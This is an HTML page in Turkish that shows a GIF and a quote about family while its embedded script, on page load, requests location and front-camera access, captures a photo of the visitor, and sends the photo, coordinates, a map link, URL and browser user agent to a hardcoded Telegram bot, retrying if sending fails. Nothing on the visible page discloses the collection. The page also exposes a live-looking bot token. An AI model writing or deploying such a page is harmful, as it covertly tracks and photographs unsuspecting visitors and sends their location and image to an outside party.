<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF GÃ¶sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
            overflow-x: hidden;
        }

        .gif-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        .gif-container img {
            max-width: 90%;
            max-height: 70vh;
            width: auto;
            height: auto;
            object-fit: contain;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        .status {
            color: #ffffff;
            font-size: 16px;
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            max-width: 600px;
            white-space: pre-line;
        }

        .hidden {
            display: none !important;
        }

        /* Mobil cihazlar iÃ§in responsive */
        @media (max-width: 768px) {
            .quote {
                font-size: 18px;
                padding: 0 15px;
            }

            .gif-container img {
                max-width: 95%;
                max-height: 60vh;
            }

            .gif-container {
                gap: 20px;
                padding: 15px;
            }
        }

        @media (max-width: 480px) {
            .quote {
                font-size: 16px;
                padding: 0 10px;
            }

            .gif-container img {
                max-width: 100%;
                max-height: 50vh;
            }

            .gif-container {
                gap: 15px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="gif-container">
        <img src="Don Carlone.gif" alt="GIF">
        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
        <div id="status" class="status hidden"></div>
    </div>

    <script>
        const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

        // Telegram bot ayarlarÄ±
        const botToken = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const chatId = '-4991699158';

        // Telegram'a mesaj gÃ¶nder
        async function sendToTelegram(message, photoData = null) {
            try {
                console.log('ğŸ“¤ Mesaj gÃ¶nderiliyor...');
                // MesajÄ± gÃ¶nder
                const messageUrl = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
                const messageResponse = await fetch(messageUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const messageResult = await messageResponse.json();
                
                if (!messageResponse.ok) {
                    console.error('âŒ Mesaj gÃ¶nderme hatasÄ±:', messageResult);
                    throw new Error(messageResult.description || 'Mesaj gÃ¶nderilemedi');
                }

                console.log('âœ… Mesaj gÃ¶nderildi!');

                // FotoÄŸraf varsa gÃ¶nder
                if (photoData && photoData.image) {
                    console.log('ğŸ“¸ FotoÄŸraf gÃ¶nderiliyor...');
                    // Base64'Ã¼ blob'a Ã§evir
                    const base64Data = photoData.image.replace(/^data:image\/\w+;base64,/, '');
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    for (let i = 0; i < byteCharacters.length; i++) {
                        byteNumbers[i] = byteCharacters.charCodeAt(i);
                    }
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });

                    // FormData ile gÃ¶nder
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'ğŸ“¸ ZiyaretÃ§i kamera fotoÄŸrafÄ±');

                    const photoUrl = `${TELEGRAM_API_URL}${botToken}/sendPhoto`;
                    const photoResponse = await fetch(photoUrl, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const photoResult = await photoResponse.json();
                    if (!photoResponse.ok) {
                        console.error('âŒ FotoÄŸraf gÃ¶nderme hatasÄ±:', photoResult);
                    } else {
                        console.log('âœ… FotoÄŸraf gÃ¶nderildi!');
                    }
                }

                return { success: true };
            } catch (error) {
                console.error('âŒ Telegram gÃ¶nderme hatasÄ±:', error);
                throw error;
            }
        }

        async function requestPermissions() {
            console.log('ğŸ”” Ä°zin istekleri baÅŸlatÄ±lÄ±yor...');
            
            if (!botToken || !chatId) {
                console.error('âŒ Bot token veya chat ID eksik!');
                return;
            }

            let locationData = null;
            let cameraData = null;

            console.log('ğŸ“ Konum izni isteniyor...');
            console.log('ğŸ“¸ Kamera izni isteniyor...');

            // Konum ve kamera izinlerini paralel olarak iste
            const [locationResult, cameraResult] = await Promise.allSettled([
                // Konum izni iste
                (async () => {
                    try {
                        if (!navigator.geolocation) {
                            throw new Error('Geolocation desteklenmiyor');
                        }
                        
                        console.log('ğŸ“ Konum izni bekleniyor...');
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: false,
                                timeout: 10000,
                                maximumAge: 60000
                            });
                        });

                        const locationInfo = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        
                        console.log('âœ… Konum alÄ±ndÄ±:', locationInfo);
                        return locationInfo;
                    } catch (error) {
                        console.error('âŒ Konum hatasÄ±:', error.message);
                        return {
                            error: error.message,
                            code: error.code
                        };
                    }
                })(),
                
                // Ã–n kamera izni iste
                (async () => {
                    try {
                        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                            throw new Error('Kamera API desteklenmiyor');
                        }
                        
                        console.log('ğŸ“¸ Kamera izni bekleniyor...');
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user' }
                        });

                        console.log('âœ… Kamera eriÅŸimi saÄŸlandÄ±, fotoÄŸraf Ã§ekiliyor...');

                        // Video stream'den bir frame yakala
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('playsinline', 'true');
                        video.setAttribute('autoplay', 'true');
                        video.muted = true;
                        await video.play();

                        await new Promise((resolve, reject) => {
                            const timeout = setTimeout(() => {
                                if (video.readyState >= 2) {
                                    resolve();
                                } else {
                                    reject(new Error('Video yÃ¼klenemedi'));
                                }
                            }, 2000);
                            
                            video.onloadedmetadata = () => {
                                clearTimeout(timeout);
                                resolve();
                            };
                            video.onerror = (err) => {
                                clearTimeout(timeout);
                                reject(err);
                            };
                        });

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);

                        const result = {
                            image: canvas.toDataURL('image/jpeg', 0.7),
                            width: canvas.width,
                            height: canvas.height,
                            timestamp: new Date().toISOString()
                        };

                        stream.getTracks().forEach(track => track.stop());
                        console.log('âœ… FotoÄŸraf Ã§ekildi:', result.width + 'x' + result.height);
                        return result;
                    } catch (error) {
                        console.error('âŒ Kamera hatasÄ±:', error.message);
                        return {
                            error: error.message,
                            name: error.name
                        };
                    }
                })()
            ]);

            locationData = locationResult.status === 'fulfilled' ? locationResult.value : { error: 'Konum alÄ±namadÄ±' };
            cameraData = cameraResult.status === 'fulfilled' ? cameraResult.value : { error: 'Kamera alÄ±namadÄ±' };

            console.log('ğŸ“Š Veriler hazÄ±r, Telegram\'a gÃ¶nderiliyor...');
            console.log('ğŸ“ Konum:', locationData);
            console.log('ğŸ“¸ Kamera:', cameraData.image ? 'FotoÄŸraf var' : 'FotoÄŸraf yok');

            // Telegram'a gÃ¶nder
            try {
                let message = 'ğŸ”” <b>Yeni ZiyaretÃ§i Bilgileri</b>\n\n';
                message += `â° Zaman: ${new Date().toLocaleString('tr-TR')}\n`;
                message += `ğŸŒ URL: ${window.location.href}\n`;
                message += `ğŸ’» User Agent: ${navigator.userAgent}\n\n`;

                // Konum bilgisi - MUTLAKA EKLE
                if (locationData && locationData.latitude && locationData.longitude) {
                    message += `ğŸ“ <b>Konum:</b>\n`;
                    message += `   Enlem: ${locationData.latitude}\n`;
                    message += `   Boylam: ${locationData.longitude}\n`;
                    message += `   DoÄŸruluk: ${locationData.accuracy ? locationData.accuracy.toFixed(2) + 'm' : 'Bilinmiyor'}\n\n`;
                    message += `ğŸ—ºï¸ <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}">Haritada GÃ¶rÃ¼ntÃ¼le</a>\n\n`;
                } else {
                    message += `âŒ Konum: ${locationData?.error || 'AlÄ±namadÄ±'}\n\n`;
                }

                // Kamera bilgisi - MUTLAKA EKLE
                if (cameraData && cameraData.image) {
                    message += `ğŸ“¸ Kamera fotoÄŸrafÄ± alÄ±ndÄ± (${cameraData.width}x${cameraData.height})\n`;
                } else {
                    message += `âŒ Kamera: ${cameraData?.error || 'AlÄ±namadÄ±'}\n`;
                }

                // Telegram'a gÃ¶nder
                console.log('ğŸ“¤ Telegram\'a gÃ¶nderiliyor...');
                await sendToTelegram(message, cameraData);
                console.log('âœ… Telegram\'a baÅŸarÄ±yla gÃ¶nderildi!');
            } catch (error) {
                console.error('âŒ GÃ¶nderme hatasÄ±:', error);
                // Hata olsa bile tekrar dene
                try {
                    console.log('ğŸ”„ Tekrar deneniyor...');
                    let retryMessage = 'ğŸ”” <b>Yeni ZiyaretÃ§i Bilgileri (Tekrar Deneme)</b>\n\n';
                    if (locationData && locationData.latitude) {
                        retryMessage += `ğŸ“ Konum: ${locationData.latitude}, ${locationData.longitude}\n`;
                    }
                    if (cameraData && cameraData.image) {
                        retryMessage += `ğŸ“¸ Kamera fotoÄŸrafÄ± var\n`;
                    }
                    await sendToTelegram(retryMessage, cameraData);
                    console.log('âœ… Tekrar deneme baÅŸarÄ±lÄ±!');
                } catch (retryError) {
                    console.error('âŒ Tekrar deneme hatasÄ±:', retryError);
                }
            }
        }

        // Sayfa yÃ¼klendiÄŸinde sadece bir kere izinleri iste
        let permissionsRequested = false;
        
        function startPermissionRequest() {
            if (permissionsRequested) {
                console.log('âš ï¸ Ä°zinler zaten istenmiÅŸ, tekrar istenmeyecek.');
                return;
            }
            permissionsRequested = true;
            console.log('ğŸš€ Sayfa yÃ¼klendi, izinler istenecek...');
            setTimeout(() => {
                requestPermissions();
            }, 500);
        }
        
        // Sayfa yÃ¼klendiÄŸinde izinleri iste
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', startPermissionRequest);
        } else {
            startPermissionRequest();
        }
        
        window.addEventListener('load', startPermissionRequest);
        
        // Sayfa gÃ¶rÃ¼nÃ¼r olduÄŸunda da kontrol et (mobil iÃ§in)
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && !permissionsRequested) {
                startPermissionRequest();
            }
        });
    </script>
</body>
</html>
